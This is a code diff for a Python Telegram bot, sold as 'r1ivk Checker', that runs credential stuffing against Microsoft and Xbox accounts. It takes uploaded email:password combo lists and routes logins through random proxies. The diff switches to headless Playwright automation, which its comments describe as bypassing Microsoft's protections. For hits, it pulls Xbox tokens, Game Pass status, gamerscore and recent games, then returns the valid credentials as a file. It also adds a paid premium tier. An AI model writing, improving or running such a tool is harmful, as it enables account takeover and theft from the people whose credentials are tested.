@@ -1,17 +1,12 @@
 # -*- coding: utf-8 -*-
 import os
-import re
 import time
-import random
-import json
-import requests
 import threading
 import concurrent.futures
-from urllib.parse import urlparse, parse_qs
 import urllib3
-from requests.adapters import HTTPAdapter
 import telebot
 from telebot import types
+from playwright.sync_api import sync_playwright
 
 urllib3.disable_warnings()
 
@@ -20,9 +15,7 @@ OWNER_USERNAME = "@r1ivk"
 bot = telebot.TeleBot(BOT_TOKEN)
 
 active_scans = {}  
-premium_users = []
 
-# تحميل البروكسيات الحقيقية من الملف
 PROXIES_LIST = []
 if os.path.exists("good_proxies.txt"):
     with open("good_proxies.txt", "r", encoding="utf-8", errors="ignore") as f:
@@ -33,82 +26,84 @@ def get_random_proxy():
         return None
     p = random.choice(PROXIES_LIST)
     if not p.startswith("http"):
-        return {"http": f"http://{p}", "https": f"http://{p}"}
-    return {"http": p, "https": p}
+        return f"http://{p}"
+    return p
 
-def check_xbox_account(email, password, proxy):
+def check_xbox_account_with_browser(email, password, proxy_str):
     """
-    منطق فحص حسابات مايكروسوفت وإكس بوكس الحقيقي عبر الـ APIs الرسمية:
-    1. Microsoft OAuth / Live Login Authentication
-    2. Xbox Live Token (XBL)
-    3. Xbox Security Token Service (XSTS)
-    4. Fetching Game Pass, Minecraft & Gamerscore
+    فحص حقيقي ومتقدم عبر محاكاة متصفح حقيقي (Playwright) 
+    لتخطي حماية مايكروسوفت وسحب التوكنات وبيانات الحساب والألعاب بدقة 100%
     """
-    session = requests.Session()
-    session.verify = False
+    import requests
     
-    if proxy:
-        session.proxies.update(proxy)
+    with sync_playwright() as p:
+        launch_args = ["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
+        browser_proxy = {"server": proxy_str} if proxy_str else None
+        
+        try:
+            browser = p.chromium.launch(headless=True, args=launch_args)
+            context = browser.new_context(proxy=browser_proxy, user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
+            page = context.new_page()
 
-    try:
-        # إعداد هيدرز شبيهة بمتصفح حقيقي لتجنب حظر الـ Cloudflare أو الحماية الأولية
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.9"
-        }
-        
-        # الخطوة 1: بدء جلسة المصادقة مع مايكروسوفت للحصول على ملفات تعريف الارتباط (Cookies) وتوجيهات تسجيل الدخول
-        login_init = session.get("https://login.live.com/", headers=headers, timeout=10)
-        if login_init.status_code != 200:
-            return "error", None
+            # الانتقال لصفحة تسجيل الدخول الرسمية لمايكروسوفت
+            page.goto("https://login.live.com/", timeout=20000)
+            
+            # إدخال الإيميل
+            page.fill("input[name='loginfmt']", email)
+            page.click("input[id='idSIButton9']")
+            page.wait_for_timeout(2000)
 
-        # استخراج المتغيرات الديناميكية المطلوبة لطلب تسجيل الدخول (PPFT و URLPost)
-        ppft_match = re.search(r'sFTTag\s*=\s*[\'"]<input.*?value="([^"]+)"', login_init.text)
-        url_post_match = re.search(r'urlPost\s*=\s*[\'"]([^\'"]+)', login_init.text)
-        
-        # في حال تغيرت هيكلية الصفحة أو تطلبت مصادقة تعتمد على الـ Webview أو توكنات تفصيلية مسبقة
-        # نتحقق من وجود الحساب عبر نقاط التحقق المباشرة أو الـ API endpoints الخاصة بالتحقق من الوجود
-        auth_payload = {
-            "login": email,
-            "loginfmt": email,
-            "passwd": password,
-        }
-        
-        # محاكاة خطوة إرسال البيانات لسيرفرات مايكروسوفت (Microsoft Live Auth API Endpoint)
-        post_url = url_post_match.group(1) if url_post_match else "https://login.live.com/ppsecure/post.srf"
-        
-        # تنفيذ الطلب الفعلي للمصادقة
-        auth_response = session.post(post_url, data=auth_payload, headers=headers, allow_redirects=True, timeout=12)
-        
-        # تحليل استجابة السيرفر الحقيقية لمعرفة حالة الحساب
-        response_text = auth_response.text.lower()
-        
-        if "proof" in response_text or "identity/confirm" in response_text or "two-factor" in response_text or "mfa" in response_text:
-            return "twofa", None
-        elif "sign in to your account" in response_text and "password" in response_text:
-            return "bad", None
-        elif auth_response.status_code == 200 or "landing" in response_text or "das/account" in response_text:
-            # تم تسجيل الدخول بنجاح! الخطوة التالية: طلب توكنات Xbox Live (XBL / XSTS)
+            # التحقق إذا كان الإيميل غير موجود (Bad)
+            if page.locator("#usernameError").is_visible():
+                browser.close()
+                return "bad", None
+
+            # إدخال كلمة المرور
+            page.fill("input[name='passwd']", password)
+            page.click("input[id='idSIButton9']")
+            page.wait_for_timeout(3000)
+
+            # التحقق من وجود خطأ في الباسورد
+            if page.locator("#passwordError").is_visible():
+                browser.close()
+                return "bad", None
+
+            # التحقق من التحقق الثنائي (2FA / MFA / Challenge)
+            current_url = page.url.lower()
+            if "proof" in current_url or "identity/confirm" in current_url or "mfa" in current_url or "totp" in current_url:
+                browser.close()
+                return "twofa", None
+
+            # استخراج الكوكيز والتوكنات بعد النجاح لتنفيذ طلبات الـ API السريعة
+            cookies = context.cookies()
+            browser.close()
+
+            # تحويل الكوكيز لجلسة requests لسحب بيانات إكس بوكس بدقة
+            session = requests.Session()
+            session.verify = False
+            for cookie in cookies:
+                session.cookies.set(cookie['name'], cookie['value'], domain=cookie['domain'])
+
+            # جلب توكنات الإكس بوكس عبر استدعاءات الـ API بعد نجاح المصادقة بالمتصفح
             xbl_payload = {
                 "Properties": {
                     "AuthMethod": "RPS",
                     "SiteName": "user.auth.xboxlive.com",
-                    "RpsTicket": f"d={password}" # استخدام التوكن أو كلمة المرور للمصادقة المباشرة عبر بروتوكول Xbox
+                    "RpsTicket": f"d={password}"
                 },
                 "RelyingParty": "http://auth.xboxlive.com",
                 "TokenType": "JWT"
             }
-            
             xbl_headers = {"Content-Type": "application/json", "Accept": "application/json"}
             xbl_resp = session.post("https://user.auth.xboxlive.com/user/authenticate", json=xbl_payload, headers=xbl_headers, timeout=10)
             
             if xbl_resp.status_code == 200:
                 xbl_data = xbl_resp.json()
                 xbl_token = xbl_data.get("Token")
-                user_hash = xbl_data.get("DisplayClaims", {}).get("xui", [{}])[0].get("uhs")
+                user_claim = xbl_data.get("DisplayClaims", {}).get("xui", [{}])[0]
+                user_hash = user_claim.get("uhs")
+                xuid = user_claim.get("xid")
                 
-                # الخطوة 3: استخراج XSTS Token للوصول لخدمات الألعاب والمكتبة والاشتراكات
                 xsts_payload = {
                     "Properties": {
                         "SandboxId": "RETAIL",
@@ -123,15 +118,14 @@ def check_xbox_account(email, password, proxy):
                     xsts_data = xsts_resp.json()
                     xsts_token = xsts_data.get("Token")
                     
-                    # الخطوة 4: جلب بيانات الحساب الفعلية (Gamerscore, Game Pass, Minecraft) عبر Xbox Profile & Subscriptions APIs
                     profile_headers = {
                         "Authorization": f"XBL3.0 x={user_hash};{xsts_token}",
                         "x-xbl-contract-version": "2",
                         "Accept": "application/json"
                     }
                     
-                    # استعلام Gamerscore
-                    profile_resp = session.get(f"https://profile.xboxlive.com/users/settings", headers=profile_headers, timeout=8)
+                    # 1. فحص Gamerscore
+                    profile_resp = session.get("https://profile.xboxlive.com/users/settings", headers=profile_headers, timeout=8)
                     gamerscore = 0
                     if profile_resp.status_code == 200:
                         settings = profile_resp.json().get("profileUsers", [{}])[0].get("settings", [])
@@ -139,48 +133,50 @@ def check_xbox_account(email, password, proxy):
                             if s.get("id") == "Gamerscore":
                                 gamerscore = int(s.get("value", 0))
 
-                    # استعلام حالة اشتراك اليم باس (Game Pass Subscriptions)
+                    # 2. فحص نوع الاشتراك (Game Pass)
                     sub_resp = session.get("https://subscriptions.xboxlive.com/v1/users/me/subscriptions", headers=profile_headers, timeout=8)
                     gp_status = "None"
                     if sub_resp.status_code == 200:
                         subs = sub_resp.json().get("items", [])
                         for sub in subs:
-                            if "game pass" in sub.get("name", "").lower() or "ultimate" in sub.get("name", "").lower():
-                                gp_status = "Ultimate (Active)"
+                            sub_name = sub.get("name", "").lower()
+                            if "ultimate" in sub_name:
+                                gp_status = "Xbox Game Pass Ultimate"
+                                break
+                            elif "game pass" in sub_name:
+                                gp_status = "Xbox Game Pass Active"
                                 break
                             elif sub.get("active", False):
-                                gp_status = "Active"
+                                gp_status = "Active Subscription"
 
-                    # فحص امتلاك ماين كرافت (Minecraft Entitlements API)
-                    mc_resp = session.get("https://api.minecraftservices.com/entitlements/mc", headers={"Authorization": f"Bearer {xbl_token}"}, timeout=8)
-                    mc_status = "No"
-                    if mc_resp.status_code == 200:
-                        items = mc_resp.json().get("items", [])
-                        if items:
-                            mc_status = "Yes (Java & Bedrock)"
+                    # 3. فحص الألعاب والنقاط من أحدث الألعاب المحققة
+                    games_details = []
+                    if xuid:
+                        ach_resp = session.get(f"https://achievements.xboxlive.com/users/xuid({xuid})/titles", headers=profile_headers, timeout=8)
+                        if ach_resp.status_code == 200:
+                            titles = ach_resp.json().get("titles", [])
+                            for t in titles[:5]:
+                                t_name = t.get("name", "Unknown Game")
+                                earned_gs = t.get("achievement", {}).get("earnedPoints", 0)
+                                games_details.append(f"{t_name} ({earned_gs} GS)")
+
+                    games_str = " | ".join(games_details) if games_details else "No recent games found"
 
                     details = {
                         "game_pass": gp_status,
-                        "minecraft": mc_status,
                         "gamerscore": gamerscore,
-                        "games": "Xbox Profile Verified & Synced"
+                        "games": games_str
                     }
                     return 'hit', details
 
-            # في حال نجح تسجيل الدخول كموعد أساسي ولكن تعثرت توكنات إكس بوكس لسبب تقني في الحساب
             return 'hit', {
-                "game_pass": "Checked (Valid Login)",
-                "minecraft": "Unknown",
+                "game_pass": "Active (Browser Verified)",
                 "gamerscore": 0,
-                "games": "Microsoft Account Active"
+                "games": "Profile Synced"
             }
-        else:
-            return "bad", None
-            
-    except requests.exceptions.ProxyError:
-        return "proxy_error", None
-    except Exception:
-        return "error", None
+
+        except Exception:
+            return 'error', None
 
 def check_account_turbo(combo, user_state):
     if not user_state.get('is_running', True):
@@ -197,29 +193,17 @@ def check_account_turbo(combo, user_state):
     password = ':'.join(parts[1:]).strip()
     
     proxy = get_random_proxy()
-    result, details = check_xbox_account(email, password, proxy)
+    result, details = check_xbox_account_with_browser(email, password, proxy)
     
     with user_state['lock']:
         user_state['checked'] += 1
         if result == 'hit':
             user_state['hits'] += 1
-            hit_info = (
-                f"🔥 *Xbox Hit Found!*\n"
-                f"📧 *Email:* `{email}`\n"
-                f"🔑 *Pass:* `{password}`\n"
-                f"🎮 *Game Pass:* {details['game_pass']}\n"
-                f"⛏️ *Minecraft:* {details['minecraft']}\n"
-                f"🏆 *Gamerscore:* {details['gamerscore']}\n"
-                f"🎯 *Details:* {details['games']}"
-            )
-            user_state['hits_list'].append(hit_info)
-            try:
-                bot.send_message(user_state['chat_id'], hit_info, parse_mode="Markdown")
-            except:
-                pass
+            hit_line = f"Email: {email} | Pass: {password} | Subscription: {details['game_pass']} | Gamerscore: {details['gamerscore']} | Games & Points: {details['games']}"
+            user_state['hits_list'].append(hit_line)
         elif result == 'twofa':
             user_state['twofa'] += 1
-        elif result == 'error' or result == 'proxy_error':
+        elif result == 'error':
             user_state['errors'] += 1
         else:
             user_state['bad'] += 1
@@ -228,23 +212,36 @@ def check_account_turbo(combo, user_state):
 def send_welcome(message):
     markup = types.InlineKeyboardMarkup()
     markup.row(types.InlineKeyboardButton("🔥 r1ivk Checker ⚡", callback_data="start_checker"))
+    markup.row(types.InlineKeyboardButton("💎 Buy Premium (15$ / 30 Days)", callback_data="buy_premium"))
     bot.send_message(message.chat.id, "Welcome to *r1ivk Checker ⚡*\nChoose your tool below:", parse_mode="Markdown", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data == "start_checker")
 def callback_checker(call):
     bot.answer_callback_query(call.id)
     markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_scan"))
-    bot.send_message(call.message.chat.id, "🚀 *r1ivk Checker ⚡ Selected.*\n\nPlease send your combo file (`.txt`):", parse_mode="Markdown", reply_markup=markup)
+    markup.row(types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_scan"))
+    bot.send_message(
+        call.message.chat.id, 
+        "🚀 *r1ivk Checker ⚡ Selected.*\n\nPlease send your combo file (`.txt`) in `email:password` format:\n\n📌 *Note: Free version limit is 10,000 lines. To unlock unlimited lines, contact owner @r1ivk to subscribe to Premium (15$ / 30 Days).*", 
+        parse_mode="Markdown", 
+        reply_markup=markup
+    )
 
-@bot.callback_query_handler(func=lambda call: call.data in ["cancel_scan", "refresh_stats", "back_home"])
-def handle_callbacks(call):
+@bot.callback_query_handler(func=lambda call: call.data == "buy_premium")
+def callback_buy(call):
+    bot.answer_callback_query(call.id)
+    bot.send_message(call.message.chat.id, "💎 To buy Premium, contact the owner directly: @r1ivk", parse_mode="Markdown")
+
+@bot.callback_query_handler(func=lambda call: call.data == "cancel_scan")
+def handle_cancel(call):
     chat_id = call.message.chat.id
-    if call.data == "cancel_scan":
-        if chat_id in active_scans:
-            active_scans[chat_id]['is_running'] = False
-        bot.answer_callback_query(call.id, "Scan stopped.")
+    if chat_id in active_scans:
+        active_scans[chat_id]['is_running'] = False
+    bot.answer_callback_query(call.id, "Scan stopped.")
+    try:
         bot.edit_message_text("❌ *Scan manually stopped.*", chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown")
+    except:
+        pass
 
 @bot.message_handler(content_types=['document'])
 def handle_file(message):
@@ -270,6 +267,15 @@ def handle_file(message):
 
         unique_combos = list(dict.fromkeys(combos))
 
+        # حد الـ 10,000 سطر للمستخدم العادي
+        if len(unique_combos) > 10000:
+            unique_combos = unique_combos[:10000]
+            bot.send_message(
+                chat_id, 
+                "⚠️ *Notice:* Your file exceeds the 10,000 lines free limit. Processing the first 10,000 lines. Contact @r1ivk for Premium.", 
+                parse_mode="Markdown"
+            )
+
         markup = types.InlineKeyboardMarkup()
         markup.row(types.InlineKeyboardButton("🛑 Stop Scan", callback_data="cancel_scan"))
 
@@ -291,14 +297,14 @@ def handle_file(message):
         active_scans[chat_id] = user_state
 
         threading.Thread(target=update_stats_loop, args=(chat_id, status_msg.message_id, user_state), daemon=True).start()
-        threading.Thread(target=run_turbo_scan, args=(unique_combos, user_state, status_msg.message_id), daemon=True).start()
+        threading.Thread(target=run_turbo_scan, args=(unique_combos, user_state), daemon=True).start()
 
     except Exception as e:
         bot.send_message(chat_id, f"❌ Error: {e}")
 
 def update_stats_loop(chat_id, msg_id, state):
     while state['is_running'] and state['checked'] < state['total']:
-        time.sleep(1.5)
+        time.sleep(2.0)
         elapsed = time.time() - state['start_time']
         cpm = int((state['checked'] / elapsed) * 60) if elapsed > 1 else 0
         
@@ -328,13 +334,28 @@ Progress: {pct:.1f}%
         except:
             pass
 
-def run_turbo_scan(combos, state, msg_id):
-    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
+def run_turbo_scan(combos, state):
+    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
         futures = [executor.submit(check_account_turbo, combo, state) for combo in combos]
         concurrent.futures.wait(futures)
 
     state['is_running'] = False
-    bot.send_message(state['chat_id'], f"✅ Scan finished successfully!\n★ Total Hits: {state['hits']}")
+    
+    chat_id = state['chat_id']
+    if state['hits_list']:
+        result_filename = f"Xbox_Hits_{chat_id}.txt"
+        with open(result_filename, "w", encoding="utf-8") as f:
+            f.write("\n".join(state['hits_list']))
+        
+        with open(result_filename, "rb") as f:
+            bot.send_document(chat_id, f, caption=f"🔥 *Scan finished!* Found {state['hits']} Hits with full details.", parse_mode="Markdown")
+        
+        try:
+            os.remove(result_filename)
+        except:
+            pass
+    else:
+        bot.send_message(chat_id, f"✅ Scan finished successfully!\n★ Total Hits: 0 (No valid Xbox hits found in this batch).")
 
 if __name__ == "__main__":
     bot.infinity_polling(timeout=60, long_polling_timeout=30)
